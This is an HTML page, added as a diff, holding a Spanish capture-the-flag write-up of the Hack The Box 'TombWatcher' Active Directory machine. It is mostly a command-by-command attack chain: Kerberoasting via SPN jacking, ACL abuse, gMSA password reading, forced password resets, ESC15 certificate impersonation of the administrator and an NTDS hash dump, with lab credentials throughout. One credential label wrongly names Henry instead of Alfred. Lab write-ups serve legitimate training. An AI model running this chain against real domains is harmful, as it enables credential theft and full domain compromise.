@@ -1,0 +1,185 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | TombWatcher HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/tombwatcher/pasted-image-20260324123707.png" alt="TombWatcher HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>TombWatcher</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>BloodHound</span>
+            <span>write_spn</span>
+            <span>gMSA</span>
+            <span>esc15</span>
+            <span>acl</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: BloodHound</li>
+            <li><code>Explotación</code>: <code>ACLs</code></li>
+            <li><code>Movimiento lateral</code>: <code>Henry</code> abusa de <code>WriteSPN</code> sobre <code>Alfred</code></li>
+            <li><code>Movimiento lateral</code>: <code>Alfred</code> abusa de <code>AddSelf</code> sobre el grupo <code>Infrastructure</code></li>
+            <li><code>Movimiento lateral</code>: El grupo <code>Infrastructure</code> permite leer <code>ReadGMSAPassword</code> de <code>ansible_dev$</code></li>
+            <li><code>Movimiento lateral</code>: <code>ansible_dev$</code> abusa de <code>ForceChangePassword</code> sobre <code>Sam</code></li>
+            <li><code>Movimiento lateral</code>: <code>Sam</code> abusa de <code>WriteOwner</code> sobre <code>John</code></li>
+            <li><code>Escalada de Privilegios</code>: Papelera de <code>AD</code>: restaurar un usuario con privilegios sobre un certificado <code>ESC15</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/tombwatcher/pasted-image-20260324133721.png" alt="TombWatcher HTB" />
+          <div class="code-card">
+            <h3>Assumed breach</h3>
+            <pre><code># Credenciales -&gt; henry:H3nry_987TGV!</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Enumerar con BloodHound</h3>
+            <pre><code>bloodhound-python -u henry -p &#x27;H3nry_987TGV!&#x27; -ns 10.129.232.167 -d tombwatcher.htb -c all</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: <code>Henry</code> abusa de <code>WriteSPN</code> sobre <code>Alfred</code></h2>
+          <img class="writeup-image" src="/writeups/assets/tombwatcher/pasted-image-20260324134926.png" alt="TombWatcher HTB" />
+          <div class="code-card">
+            <h3>SPN Jacking: Configurar el SPN ficticio (&lt;servicio&gt;/&lt;inventado&gt;) a alfred</h3>
+            <pre><code>bloodyAD --host 10.129.232.167 -d tombwatcher.htb -u &#x27;henry&#x27; -p &#x27;H3nry_987TGV!&#x27; set object &#x27;alfred&#x27; servicePrincipalName -v &#x27;http/webserver&#x27;</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Obtener TGS de Alfred</h3>
+            <pre><code>impacket-GetUserSPNs -dc-ip 10.129.232.167 tombwatcher.htb/&#x27;henry&#x27;:&#x27;H3nry_987TGV!&#x27; -request-user &#x27;alfred&#x27;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/tombwatcher/pasted-image-20260324135718.png" alt="TombWatcher HTB" />
+          <div class="code-card">
+            <h3>Crackear hash</h3>
+            <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash
+# Credenciales -&gt; henry:basketball</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: <code>Alfred</code> abusa de <code>AddSelf</code> sobre el grupo <code>Infrastructure</code></h2>
+          <img class="writeup-image" src="/writeups/assets/tombwatcher/pasted-image-20260324140035.png" alt="TombWatcher HTB" />
+          <div class="code-card">
+            <h3>Añadirnos al Grupo INFRASTRUCTURE</h3>
+            <pre><code>bloodyAD -u &#x27;alfred&#x27; -p &#x27;basketball&#x27; -d tombwatcher.htb --host 10.129.232.167 add groupMember &#x27;INFRASTRUCTURE&#x27; alfred</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/tombwatcher/pasted-image-20260324140420.png" alt="TombWatcher HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: El grupo <code>Infrastructure</code> permite leer <code>ReadGMSAPassword</code> de <code>ansible_dev$</code></h2>
+          <img class="writeup-image" src="/writeups/assets/tombwatcher/pasted-image-20260324140455.png" alt="TombWatcher HTB" />
+          <div class="code-card">
+            <h3>Leer Contraseña</h3>
+            <pre><code>nxc ldap 10.129.232.167 -u alfred -p basketball --gmsa
+# Credenciales NTLM -&gt; ansible_dev$:838b2bd83fbe39901be3713e8c79ce37</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/tombwatcher/pasted-image-20260324141447.png" alt="TombWatcher HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: <code>ansible_dev$</code> abusa de <code>ForceChangePassword</code> sobre <code>Sam</code></h2>
+          <img class="writeup-image" src="/writeups/assets/tombwatcher/pasted-image-20260324141718.png" alt="TombWatcher HTB" />
+          <div class="code-card">
+            <h3>Cambiar contraseña de sam</h3>
+            <pre><code>nxc smb 10.129.232.167 -u &#x27;ansible_dev$&#x27; -H &#x27;838b2bd83fbe39901be3713e8c79ce37&#x27; -M change-password -o USER=sam NEWPASS=&#x27;sam123&#x27;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/tombwatcher/pasted-image-20260324142046.png" alt="TombWatcher HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: <code>Sam</code> abusa de <code>WriteOwner</code> sobre <code>John</code></h2>
+          <img class="writeup-image" src="/writeups/assets/tombwatcher/pasted-image-20260324142138.png" alt="TombWatcher HTB" />
+          <div class="code-card">
+            <h3>Modificar propietario de john</h3>
+            <pre><code># Convertirse en propietario de john para poder modificar su DACL y hacer un ForceChangePassword
+bloodyAD --host dc01.tombwatcher.htb --dc-ip 10.129.232.167 -d tombwatcher.htb -u sam -p sam123 set owner &#x27;john&#x27; &#x27;sam&#x27;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/tombwatcher/pasted-image-20260324142746.png" alt="TombWatcher HTB" />
+          <div class="code-card">
+            <h3>Modificar DACL</h3>
+            <pre><code>bloodyAD --host dc01.tombwatcher.htb --dc-ip 10.129.232.167 -d tombwatcher.htb -u sam -p sam123 add genericAll &#x27;john&#x27; &#x27;sam&#x27;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/tombwatcher/pasted-image-20260324142755.png" alt="TombWatcher HTB" />
+          <div class="code-card">
+            <h3>Cambiar contraseña de john</h3>
+            <pre><code>nxc smb 10.129.232.167 -u &#x27;sam&#x27; -p &#x27;sam123&#x27; -M change-password -o USER=john NEWPASS=&#x27;john123&#x27;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/tombwatcher/pasted-image-20260324142817.png" alt="TombWatcher HTB" />
+          <div class="code-card">
+            <h3>Acceso WinRM</h3>
+            <pre><code>evil-winrm -i dc01 -u john -p john123</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Papelera AD y ESC15</h2>
+          <div class="code-card">
+            <h3>Ver objetos eliminados del AD</h3>
+            <pre><code># Importar Módulo
+Import-Module ActiveDirectory
+# Enumerar Objetos Eliminados
+Get-ADObject -Filter &#x27;isDeleted -eq $true&#x27; -IncludeDeletedObjects</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/tombwatcher/pasted-image-20260324161753.png" alt="TombWatcher HTB" />
+          <div class="code-card">
+            <h3>Flujo Módulo ActiveDirectory</h3>
+            <pre><code># Restaurar Objeto
+Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf 
+# Habilitar Cuenta
+Enable-ADAccount -Identity cert_admin
+# Cambiar contraseña
+Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString &quot;cert_admin123&quot; -AsPlainText -Force)
+# Eliminar Usuario (Si fuese necesario)
+Remove-ADUser -Identity cert_admin -Confirm:$false</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/tombwatcher/pasted-image-20260324164334.png" alt="TombWatcher HTB" />
+          <h3>ESC15</h3>
+          <div class="code-card">
+            <h3>Solicitar Certificado</h3>
+            <pre><code>certipy-ad req -u &#x27;cert_admin@tombwatcher.htb&#x27; -p &#x27;cert_admin123&#x27; -dc-ip &#x27;10.129.232.167&#x27; -target &#x27;dc01.tombwatcher.htb&#x27; -ca &#x27;tombwatcher-CA-1&#x27; -template &#x27;WebServer&#x27; -upn &#x27;administrator@tombwatcher.htb&#x27;  -application-policies &#x27;Client Authentication&#x27;</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Autenticarnos vía LDAP Shell</h3>
+            <pre><code>certipy-ad auth -pfx &#x27;administrator.pfx&#x27; -dc-ip &#x27;10.129.232.167&#x27; -ldap-shell
+# LDAP Shell
+add_user_to_group john administrators</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/tombwatcher/pasted-image-20260324212801.png" alt="TombWatcher HTB" />
+          <div class="code-card">
+            <h3>Dumpear NTDS</h3>
+            <pre><code>nxc smb dc01 -u john -p john123 --ntds</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/tombwatcher/pasted-image-20260324212852.png" alt="TombWatcher HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>BloodHound</span>
+            <span>write_spn</span>
+            <span>gMSA</span>
+            <span>esc15</span>
+            <span>acl</span>
+            <span>writespn</span>
+            <span>readgmsapassword</span>
+            <span>addself</span>
+            <span>ForceChangePassword</span>
+            <span>writeowner</span>
+            <span>ad_recycle_bins</span>
+            <span>ad_cs</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
